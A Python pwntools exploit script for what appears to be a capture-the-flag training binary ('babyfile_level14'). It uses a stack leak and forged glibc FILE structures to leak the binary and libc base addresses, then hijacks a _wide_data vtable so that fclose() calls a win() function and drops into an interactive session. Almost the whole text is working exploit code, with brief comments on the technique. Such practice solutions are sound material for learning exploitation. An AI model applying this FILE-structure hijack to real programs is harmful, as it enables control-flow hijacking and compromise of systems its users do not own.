# idea: *(leak + 0x98) = *main+201 -> calculate binary base
# fclose() will flush buffer to fd by setting _IO_buf_end
# open_file -> write_fp -> write_file such that *main+201 is written into /tmp/babyfile.txt
# leak libc with same trick: *(leak + 0xc8) = *__libc_start_main + 243
# grab that by open() -> read() in this python script
# open_file -> write_fp -> write_file such that win() is called 

from pwn import *

context.arch = 'amd64'

p = process("/challenge/babyfile_level14", stderr = PTY, stdout=PTY)
#p = gdb.debug("/challenge/babyfile_level14")
print(p.stderr)
print(p.stdout)
binary = ELF("/challenge/babyfile_level14")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

# stack addr leak
p.recvuntil(b"[LEAK]")
p.recvuntil(b": ")
stack_leak = int(p.recvuntil(b'\n')[:-1], 16)
print(f'stack_leak = {hex(stack_leak)}')

# dummy note
p.sendline(b'new_note')
p.sendline(b'1')
p.sendline(b'24')
p.recv()

# leak binary addr and libc addr at once
p.sendline(b'open_file')
p.sendline(b'write_fp')

target = stack_leak + 0x98
fs = FileStructure()
fs.flags = 0x800
fs._IO_read_end = target
fs._IO_write_base = target
fs._IO_write_ptr = target + 0xc8-0x98 + 0x8
fs._IO_write_end = target + 0xc8-0x98 + 0x8
fs._IO_buf_end = target + 0xc8-0x98 + 0x8
fs.fileno = 2
payload = bytes(fs)[:0x74]
p.recv()
p.send(payload)
p.recv()
p.sendline(b'close_file')
p.recvuntil(b'\n')
output = p.recv()
main_leak = output[:8]
binary_base = unpack(main_leak, 'all') - binary.sym['main'] - 201
print(f'binary_base = {hex(binary_base)}')

libc_leak = output[(0xc8-0x98):(0xc8-0x98)+0x8]
libc_base = unpack(libc_leak, 'all') - libc.sym['__libc_start_main'] - 243
libc.address = libc_base
print(f'libc_base = {hex(libc_base)}') 

'''
# leak libc addr
p.sendline(b'open_file')
p.sendline(b'write_fp')

target = stack_leak + 0xc8
fs = FileStructure()
fs.flags = 0x800
fs._IO_read_end = target
fs._IO_write_base = target
fs._IO_write_ptr = target + 0x8
fs._IO_write_end = target + 0x8
fs._IO_buf_end = target + 0x8
fs.fileno = 1
payload = bytes(fs)[:0x74]
p.recv()
p.send(payload)
p.recv()
p.sendline(b'close_file')
p.recvuntil(b':\n> \n')
libc_leak = p.recv()[:8]
libc_base = unpack(libc_leak, 'all') - libc.sym['__libc_start_main'] - 243
libc.address = libc_base
print(f'libc_base = {hex(libc_base)}')
'''
# write wide_data to stack_leak + 0x1e0 : somewhere on stack that won't affect execution until ret to main
_wide_vtable_offset = 0xe0
doallocbuf_call_offset = 0x68

p.sendline(b'open_file')
p.sendline(b'write_fp')
buf = stack_leak + 0x1e0

_wide_data_vtable = (p64(buf + 0x8) + b"\x00" * doallocbuf_call_offset + p64(binary_base + binary.sym['win']))

fs = FileStructure()
payload = fs.read(buf, (0x8 + doallocbuf_call_offset + 0x8))
p.send(payload)
p.sendline(b'read_file')
p.sendline(b'1')
p.recv()
p.send(_wide_data_vtable)

# wide_data trick to win()
p.sendline(b"open_file")
p.sendline(b'write_fp')

fs = FileStructure()
fs.vtable = libc.sym['_IO_wfile_jumps'] + 24 - 0x10 # fwrite calling vtable + 0x3
fs._lock = buf + 0xe0
fs._wide_data = buf - 0xe0
payload = bytes(fs)

p.send(payload)
p.recv()

p.sendline(b'close_file')

p.interactive()

